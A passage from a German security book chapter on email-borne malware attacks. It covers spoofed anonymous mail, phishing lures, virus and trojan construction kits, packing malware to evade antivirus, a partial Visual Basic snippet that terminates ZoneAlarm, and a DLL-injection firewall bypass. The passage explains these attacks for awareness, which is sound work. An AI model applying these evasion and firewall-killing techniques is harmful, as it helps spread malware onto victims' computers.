IP-Adresse zu hinterlassen. Zweitens sollte man sich mit einem Telefonbuch bewaffnen, um sich unter falschem Namen und Adresse beim ISP anzumelden. Es geht nat\u00fcrlich einfacher, z. B. werben Service-Provider wie T-Online mit der M\u00f6glichkeit, \u00fcber den eigenen SMTP-Server Mails mit beliebigem Absender versenden zu k\u00f6nnen.\n17.1 Angriffe via E-Mail\n341\nBild 17.2: E-Mails versenden mit beliebiger Absenderadresse\nDiese M\u00f6glichkeit, \u00fcber offene Relay-Server E-Mails (in Massen) zu versenden, nutzen zum Beispiel auch Spammer \u2013 wenn sie ihren M\u00fcll nicht \u00fcber Bot-Netze, die wie im Fall des Conficker-Wurms Millionen PCs fremdsteuern, verteilen. Eine weitere M\u00f6glichkeit ist der Einsatz eines Direct-Remailers, z. B. des Advanced Direct Remailer171. ADR agiert auf dem eigenen Rechner als Server. Man schreibt seine E-Mails von seinem gewohnten Mailprogramm aus; die einzige \u00c4nderung, die man in Eudora, Pegasus, Outlook und Konsorten machen muss, ist in die SMTP-Eingabezeile localhost einzutragen.\nBild 17.3: Mailabwicklung \u00fcber ADR\n171\nhttp://www.mailutilities.com/adr\n342\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nDas Mailprogramm sendet jetzt die Mail an den ADR-Server, der dann das Versenden bzw. die Verteilung \u00fcbernimmt.\nBild 17.4: Anonymer Spamversand via ADR\nDa bei dieser Versandmethode im E-Mail-Header aber noch die vom ISP zugewiesene IP-Adresse ausgewiesen wird, wird ein versierter Angreifer ADR \u00fcber einen Proxyserver laufen lassen, um die Restspuren zuverl\u00e4ssig zu verwischen \u2013 wobei sich allerdings die wenigsten Privatanwender die M\u00fche machen, die Kopfzeilen (Header) ihrer E-Mails n\u00e4her anzusehen. Wir haben es getestet und uns selbst eine anonyme E-Mail geschrieben, allerdings ohne einen Proxyserver zwischenzuschalten. Als Absender fungierte der ber\u00fchmteste Spion der Filmgeschichte: James Bond. Die Angaben in den Feldern From: und Sender: sind gef\u00e4lscht. Hier steht als E-Mail-Adresse\n[[email protected]](/cdn-cgi/l/email-protection)\n. Wesentlich aufschlussreicher sind die Angaben unter Received from, da die letzten Adresszeilen Angaben enthalten \u00fcber die IP-Adresse, den Rechnernamen und den ISP des Angreifers.\nBild 17.5: Spurensuche in anonymen Mails\n17.1 Angriffe via E-Mail\n343\nEs gibt Tools wie Sam Spade172, mit denen man versuchen kann, die Spuren des Angreifers zur\u00fcckzuverfolgen, wird damit aber nur in den wenigsten F\u00e4llen Erfolg haben, da die meisten Angreifer z. B. durch den Einsatz eines Proxys hier vorgesorgt haben.\nBild 17.6: Spurensuche mit Sam Spade\n17.1.2 Phishen nach Aufmerksamkeit Aufrei\u00dfer, Anmacher optischer Aufh\u00e4nger \u2013 es kommt immer darauf an, einen Internetanwender dazu zu bringen, eine Mail zu lesen bzw. auf den Anhang zu klicken. Internetkriminelle waren von jeher schon kreativ beim Erfinden solcher Eyecatcher. \u00dcber die Reihen- bzw. Rangfolge dieser Aufh\u00e4nger l\u00e4sst sich streiten. Sehr beliebt sind immer wieder emotionale Trigger frei nach dem Motto: Wenn Du diese Mail nicht liest, dann: \u2022\nhast du ein ernsthaftes Sicherheitsproblem;\n\u2022\nverlierst du Geld;\n\u2022\nentgehen dir Goodies (Spa\u00df, Bilder, Software, Verdienstm\u00f6glichkeiten) oder\n\u2022\nDu erleidest sonst einen materiellen oder immateriellen Schaden.\n172\nhttp://samspade.org: dort kann man auch direkt via Web Interface Spamadressen untersuchen\n344\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nMit anderen Worten: Der Anwender wird mehr oder weniger subtil und unbewusst dazu gebracht, sich die Nachricht anzusehen, statt sie an Ort und Stelle in den Papierkorb zu entsorgen. Schauen wir uns dazu einige Beispiele an.\nBild 17.7: Phishing-Mail\nFast jede Woche erreichen mich (PK) Mails von der Sparkasse oder der Raiffeisenbank.\nBild 17.8: Typischer Inhalt einer Phishing-Mail\nHier werden Kunden mit Qualit\u00e4tsverbesserungen, z. B. auch im Sicherheitsbereich, gek\u00f6dert. Als wesentlich dreister zeigte sich der BKA-Faker, der auf perfide Weise die \u00c4ngste des Internet-Users ausschlachtet. Ihm wird seitens des BKAs er\u00f6ffnet, dass ihm eine Anklage wegen illegaler Downloadaktivit\u00e4ten bevorsteht.\n17.1 Angriffe via E-Mail\n345\nBild 17.9: E-Mail vom BKA\nDas krasse Gegenteil erreichte mich am 25. Januar: ein polnischer Hasardeur versuchte es mit Dreistigkeit. From: Sunrise Elektronik GmbH User-Agent: Mozilla Thunderbird 1.0.6 (X11/20050716) To:\n[[email protected]](/cdn-cgi/l/email-protection)\nSubject: Ihre Bestellung # 18567 von EUR 453.00 ist angenommen Sony RX-F18 8.0 MP Digital Camera Ihre Bestellung # 18567 von EUR 453.00 ist angenommen. Ihre Karte wird mit dem faelligen Betrag belastet. Danke fuer Ihren Kauf. Als Anlage finden Sie die Rechnung. Hier ist es offenkundig, dass auf die Angst des Anwenders gesetzt wird, einen relativ hohen Betrag f\u00fcr etwas zahlen zu m\u00fcssen, was er offenkundig nicht bestellt hat. Sehr viel geschickter ist hier eine (fingierte) E-Mail von 1&1, wo ein Rechnungsbetrag von 59,99 EUR eingezogen werden soll.\n346\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.10: E-Mail-Rechnung von 1&1\nDie Maschen wechseln: Mal sind es Rechnungen, die den User so aufregen, dass er auf den Anhang klickt, um das vermutete Missverst\u00e4ndnis aufzukl\u00e4ren, mal sind es Anschreiben von BKA und Staatsanwaltschaft, mal sind es Schreiben mit angeblichen Nacktbildern. Wie auch immer. Wer hier kein gesundes Misstrauen an den Tag legt und Anh\u00e4nge anklickt bzw. Weblinks aktiviert, muss sich nicht wundern, wenn ihn dann sein Schicksal in Gestalt von Trojanern, Backdoors, W\u00fcrmern, Viren & Co. ereilt.\n17.1.3 Der Payload oder Malware aus dem Baukasten Der dritte Schritt und f\u00fcr kriminelle Hacker der kniffligste ist das Pr\u00e4parieren einer EMail mit Schadcode. Grunds\u00e4tzlich gibt es zwei M\u00f6glichkeiten. Entweder versteckt man die Malware in der in HTML erstellten Textnachricht, sodass sich der User beim Lesen mittels eines anf\u00e4lligen HTML-Viewers quasi automatisch infiziert, oder man packt den Payload als ausf\u00fchrbare Datei in den Anhang und hofft, dass der arglose und zugleich neugierig gemachte Anwender ihn anklickt. Andere Angriffstechniken beruhen auf der starken Verkn\u00fcpfung des Internet Explorers mit zahlreichen Anwendungen wie MS Outlook zum Darstellen von HTML-E-Mails, wodurch Angreifer automatisch die Kontrolle \u00fcber das System erlangten, sobald in Outlook die Nachricht im Vorschaufenster betrachtet wurde. Solche und \u00e4hnliche Angriffe, z. B. \u00fcber pr\u00e4parierte Kopfzeilen einer E-Mail, die einen Buffer-Overflow in Outlook Express ausl\u00f6sten, verpuffen heute jedoch weitgehend wirkungslos. Microsoft hat die Sicherheitsl\u00fccken gestopft und viele Anwender sind auf alternative E-MailClients ausgewichen, die als Stand-alone-L\u00f6sung oft nur die reinen Textinhalte von Mails anzeigen und damit solche Angriffe schon im Ansatz vereiteln. Was also bleibt, ist die gute alte Methode, unverf\u00e4nglich klingende Anh\u00e4nge mit Malware zu infizieren. Je nach Raffinesse des Angreifers und in Abh\u00e4ngigkeit davon, ob das Opfer Ziel einer direkten (pers\u00f6nlichen) oder ungezielten (Massenmails) Attacke werden soll, wird entweder die reine Schadfracht unter einem unverf\u00e4nglich klingenden Namen (Rechnung.exe, Bildf\u00fcrdich.exe, MP4-Viewer.exe) angeh\u00e4ngt, oder der Angreifer macht sich die M\u00fche, eine normale, einen Nutzen versprechende Programmdatei mit einem Virus, Wurm oder Trojaner zu infizieren. F\u00fcr den zuletzt genannten Fall braucht\n17.1 Angriffe via E-Mail\n347\nman einen Binder. Gut geeignet ist der in unserer Tool-Sektion vorgestellte fEvicol, womit dann die Malware mit einem unverf\u00e4nglichen Utility geb\u00fcndelt werden kann. Der Angreifer muss jetzt nur noch \u00fcberlegen, welche Art von Malware er dem Opfer unterschieben m\u00f6chte. Letztlich h\u00e4ngt das nat\u00fcrlich wieder von der Motivation des Angreifers ab und ist keine Prinzipienfrage. Will er sich r\u00e4chen oder dem Opfer eine Lektion erteilen, wird er zu einem der g\u00e4ngigen Virenbauk\u00e4sten wie z. B. JPS greifen. Wird der Virus installiert, kann man dem Opfer so gut wie jeden Zugriff auf sein System verleiden, das Security Center abschalten, den Registryaufruf unterbinden, den Taskmanager deaktivieren, das Keyboard verriegeln, Maustasten vertauschen und vieles mehr.\nBild 17.11: Wenn man das Opfer \u00e4rgern will ...\nW\u00fcrmer haben als Viren einen anderen Daseinszweck. Wer W\u00fcrmer in die Welt setzt, setzt auf Massenverbreitung. Auch hierf\u00fcr existieren Bauk\u00e4sten, z. B. das in der Szene ziemlich beliebte Czybik Gen Creation Kit. Nat\u00fcrlich kann hier auch die eine oder andere Schadensroutine angekreuzt werden; im Gegensatz zu den Virenbauk\u00e4sten kann der Angreifer aber die Ausbreitungskan\u00e4le (z. B. mIRC, Outlook, PSP, Netzwerk) bestimmen.\n348\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.12: W\u00fcrmer bauen mit wenigen Mausklicks\nWiederum ein anderer Typ von Payloads sind Trojanerbauk\u00e4sten und konfigurierbare RATs. Der Unterschied zwischen beiden Kategorien ist eher philosophischer Natur. Per definitionem ist ein Trojaner Malware, die \u2013 h\u00e4ufig getarnt als n\u00fctzliches Tool \u2013 im Hintergrund und vom User unbemerkt sch\u00e4dliche Komponenten installiert, z. B. unerw\u00fcnschte Werbung (Adware) einblendet bzw. Keylogger und/oder Backdoors installiert, also Userdaten stiehlt und dem Angreifer dadurch Zugriff auf das infizierte System gew\u00e4hrt. Ein Remote Administration Tool ist im urspr\u00fcnglichen Sinn kein Trojaner (h\u00f6lzernes Pferd + Soldaten = Verpackung + Inhalt), sondern ein Fernsteuerungstool, genauer gesagt: die einem ahnungslosen Anwender \u00bbuntergeschobene\u00ab Serverkomponente, die von einem Client (=Angreifer) \u00fcbers Netzwerk administriert werden kann. Da diese aber h\u00e4ufig unter falscher Flagge (z. B. scharfebraut.exe) im Mailanhang mitreist, sind die Grenzen flie\u00dfend. Auch was die Funktionalit\u00e4t betrifft, sind Trojaner und RAT kein Widerspruch. Ein RAT, das im Inneren eines Trojaners mitreist, repr\u00e4sentiert sozusagen die K\u00f6nigsklasse \u2013 die Komplett\u00fcbernahme des Opfer-PCs.\n17.1 Angriffe via E-Mail\n349\nBild 17.13: ProRat \u2013 Fernsteuerung fremder PCs\nDass die \u00dcberg\u00e4nge zu den Viren- und Wurmbauk\u00e4sten flie\u00dfend sind, demonstriert ProRat173: Abgesehen davon, dass man den PC des Opfers inklusive aller Datenein- und ausgaben \u00fcbers Netz \u00fcbernehmen kann, hat der Angreifer auch die M\u00f6glichkeit, dem Opfer mehr oder minder harmlose Streiche zu spielen (Funny Stuff) oder auch seine Festplatte komplett zu l\u00f6schen (Give Damage). Bevor die Malware auf die Reise geschickt wird, muss der Angreifer \u00fcberlegen, ob eine ihm bekannte Person zum Opfer gemacht wird oder ob es schlichtweg um eine Massenattacke geht, bei der die Malware m\u00f6glichst breit gestreut werden soll. Die der \u00d6ffentlichkeit zug\u00e4ngliche Version v1.9 ist nicht nur veraltet, sie weist auch einige unsch\u00f6ne Funktionsbeeintr\u00e4chtigungen auf. Das damit zusammengeklickte Servermodul ist f\u00fcr alle neueren AV-Scanner durchaus erkennbar, und wer sich hinter Router und Firewall verschanzt hat, kann nicht ferngesteuert werden. Diese (reverse connection) und andere Schmankerl sind erst in der kostenpflichtigen Variante ProRat v2.0 Special Edition (200 USD) beziehungsweise ProSyp v2.0 (250 USD) oder Kucumseme v2.0 (1000 USD) enthalten. Die Entwickler erkl\u00e4ren den relativ hohen Preise des letztgenannten Produkts damit: \u00bbKucumseme is a expensive product because of its cost so its base is for companies who want's use this product for their company's benefits.\u00ab Also auf gut Deutsch: Es ist kein Massenprodukt und nur f\u00fcr Firmen interessant, deren Gesch\u00e4ftszweck das Ausspionieren ihrer Gesch\u00e4ftspartner ist. Diese Philosophie \u00e4hnelt derjenigen der Macher von Turkojan Silver beziehungsweise Gold (www.turkojan.com).\n173\nhttp://www.prorat.net/main.php?language=english\n350\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nIndividualattacke Der Angreifer sucht sich hier gezielt ein Opfer aus; gegebenenfalls bringt er in Erfahrung, wie stark die Securitystandards und das IT-Wissen des Opfers sind, ob Virenscanner und Firewalls eingesetzt werden, das Betriebssystem regelm\u00e4\u00dfig gepatcht wird oder mit sonstigen Ma\u00dfnahmen gerechnet werden muss, die den Angriffserfolg in Frage stellen k\u00f6nnten. Angriffsmotiv\nPayload\nRachsucht / Geltungssucht\nHDKiller (Bootvirus) macht Platte durch \u00dcberschreiben der Haxdoor.KI (Backdoor + Rootkit) Bootsektoren unbrauchbar; CIH zerst\u00f6rt Windows zeitgesteuert \u00fcberschreibt ROM-BIOS; Hard Drive Killer Pro formatiert alle angeschlossenen Satan\u2019s Trick Platten; W32/Nopir-B killt die Internetverbindung; JPGVirus l\u00f6scht MP3-Dateien; (nur ein kleiner, eher willk\u00fcrlich infiziert JPG-Dateien zusammengestellter Ausschnitt)\nNeugier\nBemerkungen\nKeylogger\nDer PC wird verwanzt vgl. Kapitel 13;\nRemote Administration Tools bzw. Trojaner\nZur Tarnung der eingesetzten Malware; um Verbreitung zu testen;\nRootkits W\u00fcrmer Finanzielle Interessen\nKeylogger\nDer PC wird verwanzt vgl. Kapitel 13.\nRATs Trojaner Rootkits\nAn Wurmbauk\u00e4sten und Virus Construction Sets herrscht kein Mangel. Wer sich informieren oder zu Testzwecken das eine oder andere \u00e4ltere Tool ausprobieren m\u00f6chte, wird z. B. auf auf http://vx.netlux.org f\u00fcndig.\n17.1 Angriffe via E-Mail\n351\nBild 17.14: Paradies f\u00fcr Malwaresucher\n17.1.4 Massenattacken und Spam-Schleudern Diese Art von Angriff kommt meist via Spam-Mail auf den Rechner des Opfers. Den Angreifer bewegen meist nur zwei Motive: Entweder er will in die Hall of Fame als bester Wurmprogrammierer oder ihn bewegen schlichtere Motive, n\u00e4mlich finanzielle Interessen. Deshalb besteht der Payload meist aus einer Wurmfracht (in der Hoffnung auf Breitenwirkung) oder einer mehr oder weniger wilden Mischung aus Ad- und Spyware (z. B. die ber\u00fcchtigten Searchbars von Adware-Anbietern wie 180Solution, Gator und ihren Nachfolgern). Einziges Ziel: Das Opfer soll sowohl mit Werbem\u00fcll zugesch\u00fcttet als auch seine Accounts, Passw\u00f6rter, PINs und TANs ausspioniert und seine Rechner in Zombies verwandelt werden. Am 2. Februar 2007 fand sich bei www.gulli.com folgende aufschlussreiche Passage zu dem Wirken solcher Malware-Coder: \u00bbMithilfe der Trojaner hatten sie sich Zugang zu zahlreichen eBay- und Paypal-Konten ihrer Opfer erschwindelt. Vom Gewinn kauften sie sich elektronische Luxusg\u00fcter wie PlayStation-Spielekonsolen, iPods, Lautsprecher, eine Grafikkarte und eine Kamera. Ihnen wird auch die versuchte Erpressung von Betreibern kommerzieller Sites vorgeworfen. Es soll sich aber um einen 20-j\u00e4hrigen Anf\u00fchrer der kriminellen Vereinigung handeln, der beide Trojaner programmiert haben soll. Sein Komplize, ein 28 Jahre alter Mann, half ihm bei der Verteilung der Trojaner und managte das Netzwerk der kompromittierenden PCs. Insgesamt soll dem BotNet mindestens eine Million Rechner zum Opfer gefallen sein, die Dunkelziffer liegt weit dar\u00fcber.\u00ab\n352\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nWie erkl\u00e4rt sich der Erfolg der Angreifer? An der Raffinesse des Malware-Codes liegt es nur sehr bedingt. Er sollte nur so neuartig sein, dass die E-Mail-Provider ihn nicht herausfiltern.\nBild 17.15: Vom E-MailProvider aus dem Verkehr gezogen\nDas ist also die erste programmtechnische H\u00fcrde, die der Angreifer \u00fcberspringen muss: Er muss den Payload so gestalten, dass er nicht in den Mail-Gateways aus dem Verkehr gezogen wird. Die eingesetzte Filtertechnik bei den Service-Providern ist aus unserer Sicht von unterschiedlicher G\u00fcte; tats\u00e4chlich erreichten uns \u00fcber T-Online in einem Fenster von einem Tag immer die aktuellsten W\u00fcrmer und Trojaner, w\u00e4hrend das Netz bei Web.de oder GMX mitunter enger gekn\u00fcpft scheint. Genau diese L\u00fccken muss ein Angreifer nutzen. Er muss seine Schadfracht beim Opfer platzieren, solange der \u00bbBrieftr\u00e4ger\u00ab noch nicht wei\u00df, dass die abgelieferten Mails mit einem brandneuen Sch\u00e4dling verseucht sind. Oft reichen wenige \u00c4nderungen am Quellcode des Sch\u00e4dlings aus, um ihn durch die Maschen der signaturbasiert arbeitenden Scanner schl\u00fcpfen zu lassen. Alternativ kann ein bekannter Sch\u00e4dling auch durch ein neues Packverfahren unsichtbar gemacht werden. Nicht nur auf der dunklen Seite des Webs finden sich viele Seiten mit Hinweisen, wie man Malware mit einem PE-Crypter so verschl\u00fcsselt bzw. packt, dass mindestens Virenscanner, die mit festen Signaturen und nicht nach einem Heuristikschema arbeiten, get\u00e4uscht werden. Laufzeitkomprimierte bzw. verschl\u00fcsselte Malware kann zwar den einen oder anderen Scanner t\u00e4uschen. Der User f\u00fchrt dann den damit infizierten Mailanhang aus, nachdem sein Virenscanner f\u00e4lschlicherweise die Freigabe erteilte, aber einen Onlinew\u00e4chter kann er damit nicht in jedem Fall \u00fcberlisten. Es h\u00e4ngt im Einzelfall davon ab, wie der Scanner vorgeht. Checkt ein Malware-Scanner lediglich den Entry-Point, also die Stelle, an der in einer Datei der ausf\u00fchrbare Code normalerweise anf\u00e4ngt, kann er leicht get\u00e4uscht werden: Es reicht, einfach den Entry-Point mit einer PE-Editor zu verschieben. Manche Scanner checken verd\u00e4chtige Dateien, indem sie diese in einer Art Sandbox ausf\u00fchren. Da beim bzw. kurz nach Programmstart die Datei zwangsl\u00e4ufig \u00bbdie Hosen runter lassen muss\u00ab, gibt es f\u00fcr Scanner eine letzte Chance, den Malware-Code im Speicher zu entdecken und den Prozess abzubrechen.\n17.1 Angriffe via E-Mail\n353\nWir haben einige in der Szene kursierende Packer & Crypter getestet und \u2013 waren \u00fcberrascht. Unter der \u00dcberschrift \u00bbBlack Hat Konferenz: EXE-Packer bereiten Virenscannern Probleme\u00ab berichtete Frank Ziemann am 8. August 2006: \u00bbKein Antivirusprodukt kann mit allen verf\u00fcgbaren EXE-Packern umgehen. Es gibt einfach zu viele davon und st\u00e4ndig kommen neue dazu. Von den im M\u00e4rz laut Wildlist in freier Wildbahn gesichteten Sch\u00e4dlingen sind mehr als 92 % mit Laufzeitkomprimierern behandelt, oft auch mit mehreren verschiedenen. Von 63 Sch\u00e4dlingen der Bagle-Familie sind 62 Exemplare komprimiert, bei Mytob sind es 241 von 246, bei Sdbot gar alle 58 untersuchten Varianten. Der beliebteste Packer ist das Open-Source-Programm UPX.\u00ab Wir haben keine Tests in gro\u00dfem Stil durchgef\u00fchrt, sondern lediglich einige Malwareprogramme mit etlichen g\u00e4ngigen Packern wie UPX gepackt oder verschl\u00fcsselt. Die Resultate waren deprimierend \u2013 aus Sicht der Malware-Coder. Mit keinem Freewareoder Szenetool gelang es uns, das Rootkit vor F-Secures-Virenscannern zu verbergen. Erfolgreich waren dabei lediglich kommerziell vertriebene Tools wie z. B. der Ntkrnl Packer174, Aspack175 und PECompact176. Die Szenetools versagten durchg\u00e4ngig vor den installierten Virenscannern. Folgerung? Man nimmt als Angreifer einfach eine (gecrackte) Vollversion eines kommerziellen Crypters bzw. Packers. Moderne kommerzielle Virenscanner k\u00f6nnen zwar durchaus die meisten bekannten Sch\u00e4dlinge an einer Infektion hindern. Verschl\u00fcsselte Malware schl\u00fcpft aber unter Umst\u00e4nden zwischen diesen Maschen hindurch. Es ist nat\u00fcrlich nicht auszuschlie\u00dfen, sondern eher wahrscheinlich, dass im Untergrund Tools existieren, die \u00c4hnliches wie der Kernelpacker bzw. PECompact leisten. Von daher kann leider keine Entwarnung gegeben werden. Wenn die H\u00fcrde genommen und die Malware gut verpackt ist, muss der Virenschreiber gegebenenfalls noch daf\u00fcr sorgen, dass die bei den Opfern eventuell aktive Firewall nicht anspricht, wenn der aktivierte Sch\u00e4dling versucht, weitere Schadfracht aus dem Internet nachzuladen bzw. Daten aus dem infizierten Rechner ins Internet zu versenden.\n17.1.5 Office-Attacken Leider bleiben auch Firmenangestellte selten von derartigen Attacken verschont. Im Gegenteil \u2013 die meisten, die auf einen Mailanhang oder eine darin verlinkte Website klicken, verlassen sich dabei auf ihre Netzwerkadminstratoren beziehungsweise die Sicherheitseinstellungen der Mail-Gatewayserver. Bestes Beispiel sind verseuchte EMails mit pr\u00e4parierten PDF- beziehungsweise Office-Dokumenten, denen ganze Regierungsnetzwerke in den USA und Kanada zum Opfer gefallen sind. Besonders unr\u00fchmlich hat sich dabei GhostNet hervorgetan, mit dem angeblich chinesische Hacker das Netzwerk des Dalai Lama infiltrierten. Zum damaligen Zeitpunkt schlug kein aktueller Virenscanner Alarm bei dem verseuchten Word-Dokument, das den Trojaner Gh0st Rat aktivierte, der dann in bekannter Manier Dokumente scannte, Payload nachlud, Webcams und Mikros aktivierte, Logins und Passw\u00f6rter aussp\u00e4hte etc. 174\nhttp://download.cnet.com/NTkrnl-Packer/3000-2092_4-10615976.html\n175\nhttp://www.aspack.com\n176\nhttp://www.bitsum.com\n354\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.16: Wie das tibetische Netzwerk des Dalai Lama infiltiert wurde: Quelle: www.infowar-monitor.net\nDass Microsoft-Office-Dokumente verseucht sein k\u00f6nnen, ist seit etlichen Jahren bekannt. Weniger bekannt ist die Tatsache, dass speziell pr\u00e4parierte PDF-Files eine L\u00fccke in Adobes Acrobat Reader ausnutzen k\u00f6nnen. Auch wenn die erste Infiltrationswelle vor\u00fcber ist, h\u00e4lt sich dieser Sch\u00e4dling auf einem der vorderen Pl\u00e4tze.\n17.1 Angriffe via E-Mail\n355\nBild 17.17: Februar 2010: das PDF-Exploit auf Platz 4 der Sch\u00e4dlinge\nDer Infektionsmechanismus ist simpel: Der Sch\u00e4dling liegt segmentiert in den Daten einer Bilddatei verborgen; beim \u00d6ffnen beziehungsweise Dekodieren des Dokuments im Adobes Acrobat Reader wird nicht nur das Bild, sondern auch der oft nur wenige Kilobyte gro\u00dfe Sch\u00e4dling entpackt, der weiteren Schadcode (Payload) von einem externen Webserver nachl\u00e4dt und dann das Netz infiltriert. Mittlerweile ist ein Programm verf\u00fcgbar, mit dem man nicht nur verseuchte PDFs analysieren, sondern Payload auch selbst injizieren kann: Origami177. \u00d6ffnet man zum Beispiel die Datei Calc.pdf mit einem g\u00e4ngigen, ungepatchten PDF-Reader (Adobe, Foxit etc.), wird dabei automatisch die Datei Calc.exe aus dem Windows-Systemverzeichnis gestartet. Aber: Der besonders schlanke (low featured) SumatraPDF Reader178 erspart dem Anwender jedweden \u00c4rger mit eingebettetem Schadcode: Er ignoriert ihn schlichtweg.\n177\nhttp://security-labs.org/origami/#download\n178\nhttp://blog.kowalczyk.info/software/sumatrapdf/index.html\n356\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.18: PDF-Datei startet ein Programm\n17.1.6 Kampf der Firewall Mitte Januar 2007 ver\u00f6ffentlichte die Security-Company Matousec179 einen Exploit, mit dem der Selbstschutz der Outpost-Firewall des Herstellers Agnitum au\u00dfer Kraft gesetzt wird. Normalerweise sch\u00fctzen sich bessere Firewalls mit einem in etlichen Systemfunktionen verlinkten Kerneltreiber vor derartigen Angriffen. Potenzielle Angreifer k\u00f6nnen allerdings bei der Agnitum-Firewall mithilfe der Funktion ZwSetInformationFile diesen Treiber durch einen Dummy ersetzen. In der Folge spricht die Firewall nicht mehr an, wenn die Malware die Systemkontrolle \u00fcbernimmt und hinter dem R\u00fccken des Anwenders beliebige Daten im- oder exportiert. Wer programmieren kann, findet im Internet auch entsprechende detaillierte Anweisungen, wie Zonealarm & Co. ausgeschaltet werden k\u00f6nnen:\n179\nhttp://www.matousec.com\n17.1 Angriffe via E-Mail\n357\nBsp.: Message-ID , Zitat: Och, das mit dem Fragen, ob die Firewall geschlossen werden darf, ist \u00fcberhaupt kein Problem! Wenn ihr den Task mit TerminateProcess beendet, macht der kein Mucks mehr. Der Beispielcode beendet ZoneAlarm auf jedem Rechner kurz und schmerzlos. Code (Visual Basic):\nOption Explicit Private Declare Function CloseHandle Lib \"kernel32\" (ByVal hObject As Long) As Long Private Declare Function TerminateProcess Lib \"kernel32\" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long Private Declare Function OpenProcess Lib \"kernel32\" (ByVal dwDesiredAccess As Long, _ ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long Const PROCESS_TERMINATE = &H1 Private Declare Function GetWindowThreadProcessId Lib \"user32\" (ByVal hWnd As Long, lpdwProcessId As Long) As Long Private Declare Function FindWindow Lib \"user32\" Alias \"FindWindowA\" ( _ ByVal lpClassName As String, ByVal lpWindowName As String) As Long \u2026\nUnter http://sok1n.by.ru/Anti-Virus%20and%20Firewall%20Killers findet man die g\u00e4ngigsten Tools aufgelistet, mit denen Hacker in der Vergangenheit versucht haben, Firewalls von innen, d. h. bei der Installation der Malware auszutricksen. Die Tools sind \u00e4lteren Datums (2007); es lohnt sich durchaus, einige dieser Tools im Detail zu studieren, um ihre jeweiligen Deaktivierungsstrategien kennenzulernen. Allerdings sind diese Tools ihren Gegnern, sprich den AV-Scannern und Firewalls bekannt. Manche bekommt man also nur testweise zum Laufen, wenn man seine Hintergrundw\u00e4chter deaktiviert.\n358\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.19: Firewall-Killer\nMitunter sind Firewall-Killer auch integraler Bestandteil von Trojaner- und Wurmbauk\u00e4sten, von denen es im Netz jede Menge gibt \u2013 mit gut gestylter Benutzeroberfl\u00e4che und sehr einfach in der Bedienung. Betrachten wir dazu ein etwas \u00e4lteres Beispiel: das Creation Tool Toxic-CV (http://vx.netlux.org/vx.php?id=tt06).\n17.1 Angriffe via E-Mail\n359\nBild 17.20: Virus Construction Kit mit der F\u00e4higkeit, Firewalls zu killen\nDas Construction Kit ist lediglich 28 KB gro\u00df und bietet daf\u00fcr betr\u00e4chtliche M\u00f6glichkeiten, die Opfer zu \u00e4rgern; ganz nebenbei werden auch Antivirusprogramme und Firewalls deaktiviert. Mittlerweile (M\u00e4rz 2010) haben allerdings fast alle Hersteller von Sicherheitsl\u00f6sungen entsprechend aufger\u00fcstet. Fast alle der hier vorgestellten AV- und Firewall-Killer funktionieren bei den neuesten Produkten von F-Secure, Sophos, Zonelabs nicht mehr. Der Grund? Einerseits wurden die Erkennungsm\u00f6glichkeiten (Heuristiken) verbessert, andererseits sind die Online-/Hintergrundw\u00e4chter durch Kerneltechnologie besser gegen Fremdterminierung und Manipulation von au\u00dfen gesichert. Es ist also kaum noch m\u00f6glich, selbst mit Spezialwerkzeugen wie IceSword eine laufende Firewall oder einen aktuellen Virenw\u00e4chter zu killen. Im \u00dcbrigen ist es nat\u00fcrlich auch von Eindringlingen nicht sehr geschickt, Sicherheitsprogramme einfach nur schachmatt zu setzen. Selbst das ahnungsloseste Opfer bekommt irgendwann mit, dass mit seinem PC etwas nicht stimmt, wenn z. B. die entsprechenden Icons nicht mehr in der Trayleiste auftauchen oder keine Updates mehr m\u00f6glich sind. Viel geschickter ist es allemal, das Opfer ahnungslos zu lassen, denn wenn es einen Verdacht hat, wird es fr\u00fcher oder sp\u00e4ter dem Sch\u00e4dling auf die Spur kommen und zur Not auch seine Platte formatieren, um die Malware zu beseitigen. Dass Firewalls subtiler ausgetrickst werden k\u00f6nnen, zeigt der Demo-Trojaner Zapass.exe, der auf der Website180 der Entwickler n\u00e4her vorgestellt wird. An seiner Funktionsweise wird sehr gut deutlich, wie raffiniert sich heute Trojaner und RATs tarnen.\n180\nhttp://www.whirlywiryweb.com/article.asp?id=/trojanimplant\n360\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nBild 17.21: Klammheimlich durch die Firewall: Malware-Implantat\nZapass ist grunds\u00e4tzlich harmlos. Wird er mit einem Doppelklick aktiviert, zeigt ein Fenster die vom System freigegebenen Prozesse. Wir w\u00e4hlen jetzt manuell aus der Liste einen Prozess aus, den wir vorher der Firewall als unbedenklich bekannt gemacht haben \u2013 den Internetbrowser Mozilla Firefox. In diesen injizieren wir jetzt die Datei zapass.dll. Anschlie\u00dfend \u00fcberzeugen wir uns, ob das Implantat erfolgreich arbeitet. Im dritten Schritt starten wir einen Download. Normalerweise m\u00fcsste jetzt die Firewall, die bei allen Prozessen anspricht, die Daten ins Web schicken wollen, Alarm schlagen. Tut sie aber nicht, denn der Trojaner schleust seine Daten \u00fcber ein anderes, bereits freigegebenes Programm ins Internet bzw. l\u00e4dt von dort weitere Daten. Sicherheitstechnisch betrachtet, zeigt diese Demonstration, die wir an einer aktuellen Version von Zonealarm Pro m\u00fchelos nachvollziehen konnten, wie tr\u00fcgerisch der Glaube an den unbeschr\u00e4nkten Nutzen von Firewalls ist \u2013 nicht mit eingerechnet, dass in vielen Tests der Fachpresse Zonealarm Pro einen absoluten Spitzenplatz behaupten konnte. Be\u00e4ngstigend f\u00fcr Otto Normaluser ist die Tatsache, dass es kein einfaches Mittel gibt, sich vor solchen Bedrohungen angemessen zu sch\u00fctzen. Solange Programme, Prozesse und auch Dienste mit dem Internet kommunizieren m\u00fcssen, gibt es keinen prinzipiell sicheren Schutz vor Trojanerimplantaten, die sich durch 